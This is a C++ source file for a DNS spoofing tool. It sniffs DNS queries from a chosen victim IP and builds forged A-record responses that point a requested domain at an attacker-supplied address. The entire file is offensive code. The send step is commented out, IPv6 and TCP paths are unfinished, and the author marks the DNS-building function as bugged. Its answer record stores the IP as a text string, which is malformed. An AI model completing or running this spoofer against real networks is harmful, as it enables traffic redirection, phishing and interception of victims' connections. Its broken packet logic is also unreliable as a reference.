#include "DNSSpoofer.h"

#include <iostream>

#include <cstring>
#include <net/if.h>
#include <arpa/inet.h>
#include <netinet/ip.h>

CHaks::DNSSpoofer::DNSSpoofer()
{

}

CHaks::DNSSpoofer::~DNSSpoofer()
{
    
}

int CHaks::DNSSpoofer::Spoof(int socketFd, const char* interfaceName, char* targetIP, char* domain, char* fakeDomainIP)
{
    // filter for the correct DNS request by the targetIP
    while(true)
    {
        PacketCraft::Packet packet;
        if(packet.Receive(socketFd, 0) == APPLICATION_ERROR)
            continue;

        DNSHeader* dnsHeader = (DNSHeader*)packet.FindLayerByType(PC_DNS);
        if(dnsHeader != nullptr && dnsHeader->qr == 0) // check that this is a dns query not a response
        {
            // check the ip version of the packet
            EthHeader* ethHeader = (EthHeader*)packet.GetLayerStart(0);
            if(ethHeader->ether_type == htons(ETH_P_IP))
            {
                sockaddr_in targetIPAddr{};
                inet_pton(AF_INET, targetIP, &targetIPAddr.sin_addr);

                IPv4Header* ipv4Header = (IPv4Header*)packet.GetLayerStart(1);
                if(targetIPAddr.sin_addr.s_addr == ipv4Header->ip_src.s_addr)
                {
                    std::cout << "parsing dns request...\n";
                    dnsParser.ParseToHostFormat(*dnsHeader);
                    std::cout << "dns request parsed:\n";

                    dnsParser.PrintQueries();

                    for(unsigned int i = 0; i < dnsParser.header.qcount; ++i)
                    {
                        if((PacketCraft::FindInStr(dnsParser.questionsArray[i].qName, domain) != -1) && dnsParser.questionsArray[i].qType == 1)
                        {
                            std::cout << "dns request matching domain name received: \n";
                            packet.Print();

                            PacketCraft::Packet dnsResponse;
                            CreateFakeDNSResponse(socketFd, interfaceName, packet, dnsResponse, fakeDomainIP, dnsParser.questionsArray[i]);
                            std::cout << "fake response created:\n";
                            dnsResponse.Print();

                            /*
                            sockaddr_in dst{};
                            inet_pton(AF_INET, targetIP, &dst.sin_addr);

                            if(dnsResponse.Send(socketFd, 0, (sockaddr*)&dst, sizeof(dst)) == APPLICATION_ERROR)
                            {
                                LOG_ERROR(APPLICATION_ERROR, "PacketCraft::Packet::Send() error");
                                return APPLICATION_ERROR;
                            }
                            */
                        }
                    }
                }
            }
            else if(ethHeader->ether_type == htons(ETH_P_IPV6)) // TODO: make sure ipv6 processing code below works
            {
                sockaddr_in6 targetIPAddr{};
                inet_pton(AF_INET6, targetIP, &targetIPAddr.sin6_addr);

                IPv6Header* ipv6Header = (IPv6Header*)packet.GetLayerStart(1);
                if(memcmp(targetIPAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, 16) == 0)
                {
                    std::cout << "Matching IPv6 found in DNS packet\n";
                    packet.Print();
                }
            }
        }
    }
}

int CHaks::DNSSpoofer::CreateFakeDNSResponse(int socketFd, const char* interfaceName, PacketCraft::Packet& dnsRequestPacket,
    PacketCraft::Packet& dnsResponsePacket, char* fakeDomainIP, const PacketCraft::DNSQuestion& question)
{
    EthHeader* dnsRequestEthHeader = (EthHeader*)dnsRequestPacket.FindLayerByType(PC_ETHER_II);
    dnsResponsePacket.AddLayer(PC_ETHER_II, ETH_HLEN);
    EthHeader* dnsResponseEthHeader = (EthHeader*)dnsResponsePacket.GetLayerStart(0);
    CreateEthHeader(*dnsResponseEthHeader, *dnsRequestEthHeader);
    std::cout << "Eth header created\n";
    
    if(ntohs(dnsRequestEthHeader->ether_type) == ETH_P_IP)
    {
        IPv4Header* dnsRequestIPv4Header = (IPv4Header*)dnsRequestPacket.FindLayerByType(PC_IPV4);
        dnsResponsePacket.AddLayer(PC_IPV4, sizeof(IPv4Header));
        IPv4Header* dnsResponseIPv4Header = (IPv4Header*)dnsResponsePacket.GetLayerStart(1);
        CreateIPv4Header(*dnsResponseIPv4Header, *dnsRequestIPv4Header);
        std::cout << "IPV4 header created\n";

        if(dnsResponseIPv4Header->ip_p == IPPROTO_UDP)
        {
            UDPHeader* dnsRequestUDPHeader = (UDPHeader*)dnsRequestPacket.FindLayerByType(PC_UDP);
            dnsResponsePacket.AddLayer(PC_UDP, sizeof(UDPHeader));
            UDPHeader* dnsResponseUDPHeader = (UDPHeader*)dnsResponsePacket.GetLayerStart(2);
            CreateUDPHeader(*dnsResponseUDPHeader, *dnsRequestUDPHeader);
            std::cout << "UDP header created\n";

            // finally add DNS layer
            DNSHeader* dnsRequestDNSHeader = (DNSHeader*)dnsRequestPacket.FindLayerByType(PC_DNS);
            uint32_t dnsQuestionSize = PacketCraft::GetStrLen(question.qName) + 4; // 4 is the size of a dns question minus qName 
            uint32_t dnsAnswerSize = PacketCraft::GetStrLen(question.qName) + PacketCraft::GetStrLen(fakeDomainIP) + 10; // 10 is the size of a dns answer minus aName and rData(fakeDomainIP)
            dnsResponsePacket.AddLayer(PC_DNS, sizeof(DNSHeader) + dnsQuestionSize + dnsAnswerSize);
            DNSHeader* dnsResponseDNSHeader = (DNSHeader*)dnsResponsePacket.GetLayerStart(3);
            CreateDNSHeader(*dnsResponseDNSHeader, *dnsRequestDNSHeader, question, fakeDomainIP);
            std::cout << "DNS header created\n";

            dnsResponseIPv4Header->ip_len = htons(dnsResponsePacket.GetSizeInBytes() - sizeof(*dnsResponseEthHeader));
            dnsResponseIPv4Header->ip_sum = PacketCraft::CalculateChecksum(dnsResponseIPv4Header, sizeof(*dnsResponseIPv4Header));

            dnsResponseUDPHeader->len = htons(dnsResponsePacket.GetSizeInBytes() - sizeof(*dnsResponseEthHeader) - sizeof(*dnsResponseIPv4Header));
            dnsResponseUDPHeader->check = htons(0); // in ipv4, this is optional and therefor can be set to 0

            return NO_ERROR;
        }
        else if(dnsResponseIPv4Header->ip_p == IPPROTO_TCP)
        {
            // TODO: support for dns over tcp, and possibly others
            LOG_ERROR(APPLICATION_ERROR, "dns over tcp not supported!");
            return APPLICATION_ERROR;
        }
    }
    else if(ntohs(dnsRequestEthHeader->ether_type) == ETH_P_IPV6)
    {
        // TODO: support for ipv6
        LOG_ERROR(APPLICATION_ERROR, "ipv6 not supported!");
        return APPLICATION_ERROR;
    }
}

int CHaks::DNSSpoofer::CreateEthHeader(EthHeader& dnsResponseEthHeader, const EthHeader& dnsRequestEthHeader)
{
    memcpy(dnsResponseEthHeader.ether_dhost, dnsRequestEthHeader.ether_shost, ETH_ALEN);
    memcpy(dnsResponseEthHeader.ether_shost, dnsRequestEthHeader.ether_dhost, ETH_ALEN);
    dnsResponseEthHeader.ether_type = dnsRequestEthHeader.ether_type;

    return NO_ERROR;
}

int CHaks::DNSSpoofer::CreateIPv4Header(IPv4Header& dnsResponseIPv4Header, const IPv4Header& dnsRequestIPv4Header)
{
    dnsResponseIPv4Header.ip_hl = sizeof(dnsRequestIPv4Header) * 8 / 32;
    dnsResponseIPv4Header.ip_v = IPVERSION;                       
    dnsResponseIPv4Header.ip_tos = IPTOS_CLASS_CS0;
    dnsResponseIPv4Header.ip_len = 0; // calculated later
    dnsResponseIPv4Header.ip_id = dnsRequestIPv4Header.ip_id;
    dnsResponseIPv4Header.ip_off = htons(IP_DF);
    dnsResponseIPv4Header.ip_ttl = IPDEFTTL;
    dnsResponseIPv4Header.ip_p = dnsRequestIPv4Header.ip_p;
    dnsResponseIPv4Header.ip_sum = htons(0); // calculated later
    dnsResponseIPv4Header.ip_dst.s_addr = dnsRequestIPv4Header.ip_src.s_addr;
    dnsResponseIPv4Header.ip_src.s_addr = dnsRequestIPv4Header.ip_dst.s_addr;

    return NO_ERROR;
}

int CHaks::DNSSpoofer::CreateUDPHeader(UDPHeader& dnsResponseUDPHeader, const UDPHeader& dnsRequestUDPHeader)
{
    dnsResponseUDPHeader.source = dnsRequestUDPHeader.dest;
    dnsResponseUDPHeader.dest = dnsRequestUDPHeader.source;
    dnsResponseUDPHeader.check = 0; // calculated later
    dnsResponseUDPHeader.len = 0; // calculated later

    return NO_ERROR;
}

// BUGGED TODO:FIX (qname and name len, nlabels is wrong in both questions and answers)
int CHaks::DNSSpoofer::CreateDNSHeader(DNSHeader& dnsResponseDNSHeader, const DNSHeader& dnsRequestDNSHeader, const PacketCraft::DNSQuestion& question, char* fakeDomainIP)
{
    dnsResponseDNSHeader.id = dnsRequestDNSHeader.id;
    dnsResponseDNSHeader.qr = 1;
    dnsResponseDNSHeader.opcode = 0;
    dnsResponseDNSHeader.aa = 0;
    dnsResponseDNSHeader.tc = 0;
    dnsResponseDNSHeader.rd = 0;
    dnsResponseDNSHeader.ra = 0;
    dnsResponseDNSHeader.zero = 0;
    dnsResponseDNSHeader.rcode = 0;

    dnsResponseDNSHeader.qcount = htons(1);
    dnsResponseDNSHeader.ancount = htons(1);
    dnsResponseDNSHeader.nscount = htons(0);
    dnsResponseDNSHeader.adcount = htons(0);

    // copy question to the dns response
    uint8_t* dnsResponseDataPtr = dnsResponseDNSHeader.querySection;
    memcpy(dnsResponseDataPtr, question.qName, PacketCraft::GetStrLen(question.qName));
    dnsResponseDataPtr += PacketCraft::GetStrLen(question.qName);
    memset(dnsResponseDataPtr, 0, 1);
    ++dnsResponseDataPtr;
    memcpy(dnsResponseDataPtr, &question.qType, sizeof(question.qType));
    dnsResponseDataPtr += sizeof(question.qType);
    memcpy(dnsResponseDataPtr, &question.qClass, sizeof(question.qClass));
    dnsResponseDataPtr += sizeof(question.qClass);

    // create answer
    memcpy(dnsResponseDataPtr, question.qName, PacketCraft::GetStrLen(question.qName)); // name is the same as in the request
    dnsResponseDataPtr += PacketCraft::GetStrLen(question.qName); 
    memset(dnsResponseDataPtr, 0, 1); // 0 indicates the end of the name
    ++dnsResponseDataPtr;
    *((uint16_t*)dnsResponseDataPtr) = htons(1); // type is A record
    dnsResponseDataPtr += 2;
    *((uint16_t*)dnsResponseDataPtr) = htons(1); // class is IN
    dnsResponseDataPtr += 2;
    *((uint32_t*)dnsResponseDataPtr) = htonl(120); // time to live is 2 minutes
    dnsResponseDataPtr += 4;
    *((uint16_t*)dnsResponseDataPtr) = htons(PacketCraft::GetStrLen(fakeDomainIP)); // rdLength
    dnsResponseDataPtr += 2;
    memcpy(dnsResponseDataPtr, fakeDomainIP, PacketCraft::GetStrLen(fakeDomainIP) + 1);

    return NO_ERROR;
}